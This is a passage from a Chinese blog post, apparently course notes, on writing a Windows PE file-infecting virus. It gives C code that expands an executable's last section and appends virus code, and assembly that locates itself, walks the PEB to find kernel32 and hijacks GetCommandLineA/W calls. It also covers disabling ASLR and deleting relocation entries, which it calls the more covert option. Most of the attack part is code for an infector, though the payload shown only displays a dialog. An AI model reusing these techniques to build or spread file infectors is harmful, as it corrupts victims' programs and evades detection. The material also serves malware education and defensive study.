+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//填写GetCommandLineA字符串，相对数据区偏移56字节</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">56</span>, <span class="string">&quot;GetCommandLineA&quot;</span>);</span><br><span class="line"><span class="comment">//填写GetCommandLineW字符串，相对数据区偏移72字节</span></span><br><span class="line"><span class="built_in">strcpy</span>(virusData + <span class="number">72</span>, <span class="string">&quot;GetCommandLineW&quot;</span>);</span><br><span class="line"><span class="comment">//传递一个布尔型变量isGetCommandLineW</span></span><br><span class="line"><span class="comment">//根据其值决定是patch函数的W版还是A版，并记录在数据区标志位</span></span><br><span class="line">*(virusData + <span class="number">1</span>) = isGetCommandLineW ? <span class="number">1</span> : <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>判断是否第一次执行：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop eax;  <span class="comment">//病毒数据区自定位指令，eax指向病毒数据区实际地址</span></span><br><span class="line">cmp byte ptr [eax], <span class="number">1</span>; <span class="comment">//判断病毒是否为第一次执行</span></span><br><span class="line">jnz  first_time; <span class="comment">//病毒是第一次执行，跳到first_time标号处执行</span></span><br><span class="line"><span class="comment">//如果不是，说明病毒已经执行了，并获得GetCommandLine函数的地址</span></span><br><span class="line">mov eax, [eax + <span class="number">2</span>];  <span class="comment">//这个是由后面的first_time代码把函数地址放入数据区的</span></span><br><span class="line">jmp eax;  <span class="comment">//跳到getcommmandLineX函数</span></span><br><span class="line"></span><br><span class="line">first_time:</span><br><span class="line"> mov [eax], <span class="number">1</span>;  <span class="comment">//将是否执行标志为置为已执行</span></span><br><span class="line"> mov ebp, eax;  <span class="comment">//ebp执行病毒数据区</span></span><br><span class="line"> …… <span class="comment">//执行病毒的逻辑，弹出对话框</span></span><br></pre></td></tr></table></figure>
+
+<p>尾部添加代码，完成函数入口的查询和转跳：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  push <span class="number">16</span>;  <span class="comment">//压栈函数名的长度GetCommandLineX（W/A）的长度，getProc函数的参数</span></span><br><span class="line">  mov bl, [ebp + <span class="number">1</span>]; <span class="comment">//判断patch的函数是否为W版本，ebp指向的是数据区</span></span><br><span class="line">  test bl, bl</span><br><span class="line">  jnz xxW  <span class="comment">//patch的是W版本</span></span><br><span class="line">  lea eax, [ebp + <span class="number">56</span>];  <span class="comment">//获得字符串“getCommandLineA”的首地址</span></span><br><span class="line">  jmp xx2</span><br><span class="line">xxW:</span><br><span class="line">  lea eax, [ebp + <span class="number">72</span>];  <span class="comment">//获得字符串“getCommandLineW”的首地址</span></span><br><span class="line">xx2：</span><br><span class="line">  push eax;          <span class="comment">//将函数名压栈，getProc函数的参数</span></span><br><span class="line">  <span class="comment">//获得kernel32.dll的基地址</span></span><br><span class="line">  mov  eax, fs:[<span class="number">30</span>h]  <span class="comment">//eax执行PEB</span></span><br><span class="line">  mov  eax, [eax+<span class="number">0</span>ch] <span class="comment">//eax指向PEB_LDR</span></span><br><span class="line">  mov  eax, [eax+<span class="number">0</span>ch] <span class="comment">//eax指向第一个模块，即exe模块</span></span><br><span class="line">  mov  eax, [eax]     <span class="comment">//eax指向第二个模块，即ntdll.dll</span></span><br><span class="line">  mov  eax, [eax]     <span class="comment">//eax指向第三个模块，即kernel32.dll</span></span><br><span class="line">  mov  eax, [eax+<span class="number">18</span>h] <span class="comment">//在该模块偏移18h的地方获得kernel32.dll的基地址</span></span><br><span class="line">  push eax   <span class="comment">//将kernel32.dll基地址压栈，getProc函数的参数</span></span><br><span class="line">  call getproc   <span class="comment">//调用getProc函数，返回eax为函数的地址</span></span><br><span class="line">  mov dword ptr [ebp + <span class="number">2</span>], eax  <span class="comment">//ebp指向数据区，在数据区放入函数地址</span></span><br><span class="line">  …… <span class="comment">//平衡栈</span></span><br><span class="line">  jmp eax; <span class="comment">//跳到GetCommandLineX函数</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="病毒代码改进"><a href="#病毒代码改进" class="headerlink" title="病毒代码改进"></a>病毒代码改进</h3><ol>
+<li>病毒代码比较大，基本节的空洞放不下了</li>
+<li>最后跳回到getCommandLine函数时利用本来的IAT表项</li>
+</ol>
+<p>增加最后节的字长：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改最后节的virtualSize字段</span></span><br><span class="line">fseek(fp, - <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), SEEK_CUR); <span class="comment">//定位到节头</span></span><br><span class="line">fseek(fp, <span class="number">8</span>, SEEK_CUR);<span class="comment">//移动8字节的节名，定位到virtualSize字段</span></span><br><span class="line"><span class="type">int</span> newVirtualSize = lastSectionHdr.Misc.VirtualSize + codeSize; <span class="comment">//计算新的virtualSize的值</span></span><br><span class="line">fwrite(&amp;newVirtualSize, <span class="keyword">sizeof</span>(newVirtualSize), <span class="number">1</span>, fp); <span class="comment">//写入virtualSize的值</span></span><br><span class="line"><span class="comment">//修该最后节的SizeOfRawData</span></span><br><span class="line">fseek(fp, <span class="number">4</span>, SEEK_CUR); <span class="comment">//定位到节头的SizeOfRawData字段</span></span><br><span class="line"><span class="type">int</span> pageNum = (newVirtualSize / ntHdrs.OptionalHeader.FileAlignment); <span class="comment">//除以文件对齐粒度</span></span><br><span class="line">pageNum = pageNum * ntHdrs.OptionalHeader.FileAlignment &lt; newVirtualSize </span><br><span class="line">                   ? pageNum + <span class="number">1</span> : pageNum;  <span class="comment">//计算新的pageNum</span></span><br><span class="line"><span class="type">int</span> size = pageNum * ntHdrs.OptionalHeader.FileAlignment;   <span class="comment">//计算新的SizeOfRawData</span></span><br><span class="line">fwrite(&amp;size, <span class="keyword">sizeof</span>(size), <span class="number">1</span>, fp);  <span class="comment">//将SizeOfRawData的值写入文件</span></span><br><span class="line"><span class="comment">//定位到最后节的空洞</span></span><br><span class="line">fseek(fp, lastSectionHdr.PointerToRawData + lastSectionHdr.Misc.VirtualSize, SEEK_SET);</span><br><span class="line">fwrite(code, codeSize, <span class="number">1</span>, fp);    <span class="comment">//先填充病毒代码</span></span><br><span class="line"><span class="built_in">free</span>(code);</span><br><span class="line"><span class="comment">//在病毒代码后继续扩容</span></span><br><span class="line"><span class="type">int</span> expandedSize = size - newVirtualSize;   <span class="comment">//计算需要扩充的大小，从病毒代码后开始填充</span></span><br><span class="line"><span class="type">char</span> c = <span class="number">0</span>; <span class="comment">//每次填充0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; expandedSize; i++)  <span class="comment">//循环填充的次数</span></span><br><span class="line">fwrite(&amp;c, <span class="number">1</span>, <span class="number">1</span>, fp);  <span class="comment">//填充一个字节</span></span><br></pre></td></tr></table></figure>
+
+<p>利用IAT找到函数入口：</p>
+<ol>
+<li>call…pop自定位代码获取了数据区的地址A</li>
+<li>数据区预期加载地址B&#x3D;[A+1]</li>
+<li>IAT表项的预期地址[A+5]</li>
+<li>IAT表项重定位后的实际地址IAT_addr-[A+5]&#x3D;A-B</li>
+<li>通过[IAT_addr]获取函数入口地址</li>
+</ol>
+<h2 id="PE文件的重定位机制"><a href="#PE文件的重定位机制" class="headerlink" title="PE文件的重定位机制"></a>PE文件的重定位机制</h2><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ol>
+<li>实际和预期加载地址的差x&#x3D;A-B</li>
+<li>找到需要修改的位置y</li>
+<li>读出y开始4字节的值+x&#x3D;新地址z</li>
+<li>将z写入y开始的4字节</li>
+</ol>
+<h3 id="如何知道哪些需要重定位"><a href="#如何知道哪些需要重定位" class="headerlink" title="如何知道哪些需要重定位"></a>如何知道哪些需要重定位</h3><p>在可选头的数据目录中，有一项（第六项）就是重定位表，重定位表中记录了所有需要进行重定位修改的<strong>位置</strong></p>
+<p>在重定位表中因为都是地址值，所以只记录被修改的位置，大小4字节（32位机）</p>
+<p>需要重定位的区域以4096（2^12）字节（即16进制0x1000h）进行划分，在每个区域（Page）里面，每个需要重定位的位置都有相应的重定位项记录了该位置离这个区域起始位置的偏移</p>
+<p>针对每个区域，在重定位表中都有8字节的头部，其中前4个字节是重定位内存页的起始RVA，后4个字节是重定位块的长度（包括头和所有表项在内的字节数）</p>
+<p>划分区域后每一项只需要12位来表示地址，另外0.5字节为属性</p>
+<blockquote>
+<p>系统重定位算法，从OptionHeader的数据目录项拿到重定位表首，然后遍历上面的数据表结构，获取每个重定位项，计算重定位项的位置，按之前的算法重定位</p>
+</blockquote>
+<h3 id="总结Patch指令引起的问题"><a href="#总结Patch指令引起的问题" class="headerlink" title="总结Patch指令引起的问题"></a>总结Patch指令引起的问题</h3><p>因为我们Patch的原指令本身是包含绝对地址的指令，对于exe能重定位的情况下，正常会有指向这个绝对地址xxxx所在位置的重定位项</p>
+<p>在我们Patch指令的过程中，我们将该指令修改为了不包含绝对地址的指令形式，但没有删除针对该地址的重定位项</p>
+<p>解决方法：exe重定位项失效；删除被Patch指令的重定位项</p>
+<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ol>
+<li><p>关闭随机基址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">        readHdrs(fp); <span class="comment">//读NT头</span></span><br><span class="line">locateNTHdrStart(fp);  <span class="comment">//定位到NT头	</span></span><br><span class="line"><span class="comment">//计算dllcharacteristics到NTHeaders头部偏移</span></span><br><span class="line"><span class="type">int</span> offsetToNTHdr_DllChar = (<span class="type">int</span>)&amp;(((IMAGE_NT_HEADERS *) <span class="number">0</span>)-&gt;</span><br><span class="line">                    OptionalHeader.DllCharacteristics);</span><br><span class="line">        <span class="comment">//从NT头移动文件指针到dllcharacteristics字段的位置</span></span><br><span class="line">fseek(fp, offsetToNTHdr_DllChar, SEEK_CUR);</span><br><span class="line">        <span class="comment">//0x0040 随机加载 标识，用&amp;FFBF（即 1111 1111 1011 1111）将其去掉</span></span><br><span class="line"><span class="type">short</span> dllChar = ntHdrs.OptionalHeader.DllCharacteristics &amp; <span class="number">0xffbf</span>;</span><br><span class="line"><span class="comment">//写入新的属性值</span></span><br><span class="line">        fwrite(&amp;dllChar, <span class="keyword">sizeof</span>(dllChar), <span class="number">1</span>, fp); </span><br><span class="line">fclose(fp);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>去掉所对应的重定位项</p>
+<blockquote>
+<p>该方法不修改DLLCharacteristic，更加隐秘</p>
+<p>重定位表就是.reloc节，为了避免删除带来影响，在reloc节尾部填充删除的字节数</p>
+<p>算法：</p>
+<ol>
+<li><p>patch一条指令时，指令首部偏移2字节就是需要重定位的位置A</p>
+</li>
+<li><p>遍历reloc节查找RVA&#x3D;A的项并删除</p>
+<p>首先从reloc节内部的小表首部获取该页的加载基址的RVA为B，从后4字节获取小表大小C，共C-8（头8字节RVA和Size）&#x2F;2（每项2字节）个项，遍历，每取一项的后1.5字节假定为D，如果B+D&#x3D;&#x3D;A，删除，然后修改小表的Size值（减2），OptionalHeader数据目录中reloc项的size也减2，reloc节尾部填充2个字节</p>
+</li>
+</ol>
+</blockquote>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%AF%BE%E7%A8%8B/" rel="tag"># 课程</a>
+              <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/" rel="tag"># 计算机</a>
+              <a href="/tags/%E7%97%85%E6%AF%92/" rel="tag"># 病毒</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/19/%E7%97%85%E6%AF%92-Win-%E6%8C%87%E4%BB%A4Patch%E5%92%8C%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%9C%BA%E5%88%B6/" rel="prev" title="病毒_Win_指令Patch和导入表机制">
+      <i class="fa fa-chevron-left"></i> 病毒_Win_指令Patch和导入表机制
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/20/%E7%97%85%E6%AF%92-%E5%8F%8D%E7%97%85%E6%AF%92%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/" rel="next" title="病毒_反病毒技术简介">
+      病毒_反病毒技术简介 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E6%8C%87%E4%BB%A4Patch"><span class="nav-number">1.</span> <span class="nav-text">程序实现指令Patch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%88%B0%E9%9C%80%E8%A6%81Patch%E7%9A%84%E6%8C%87%E4%BB%A4"><span class="nav-number">1.1.</span> <span class="nav-text">如何找到需要Patch的指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%86RVA%E8%BD%AC%E6%8D%A2%E4%B8%BA%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.2.</span> <span class="nav-text">将RVA转换为文件位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Patch%E6%8C%87%E4%BB%A4%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">Patch指令的函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E5%AF%BC%E5%85%A5%E8%A1%A8%E9%A1%B9%E8%B0%83%E7%94%A8%E6%8C%87%E4%BB%A4Patch%E7%9A%84%E7%97%85%E6%AF%92%E8%AE%BE%E8%AE%A1"><span class="nav-number">2.</span> <span class="nav-text">针对导入表项调用指令Patch的病毒设计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">最后跳转指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%97%85%E6%AF%92%E6%95%B0%E6%8D%AE%E5%8C%BA"><span class="nav-number">2.2.</span> <span class="nav-text">病毒数据区</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%97%85%E6%AF%92%E4%BB%A3%E7%A0%81%E6%94%B9%E8%BF%9B"><span class="nav-number">2.3.</span> <span class="nav-text">病毒代码改进</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PE%E6%96%87%E4%BB%B6%E7%9A%84%E9%87%8D%E5%AE%9A%E4%BD%8D%E6%9C%BA%E5%88%B6"><span class="nav-number">3.</span> <span class="nav-text">PE文件的重定位机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%97%E6%B3%95"><span class="nav-number">3.1.</span> <span class="nav-text">算法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%93%AA%E4%BA%9B%E9%9C%80%E8%A6%81%E9%87%8D%E5%AE%9A%E4%BD%8D"><span class="nav-number">3.2.</span> <span class="nav-text">如何知道哪些需要重定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93Patch%E6%8C%87%E4%BB%A4%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98"><span class="nav-number">3.3.</span> <span class="nav-text">总结Patch指令引起的问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="nav-number">3.4.</span> <span class="nav-text">解决方法</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">汪道之</p>
+  <div class="site-description" itemprop="description">有的人身着布衣，却心有锦缎。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">汪道之</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
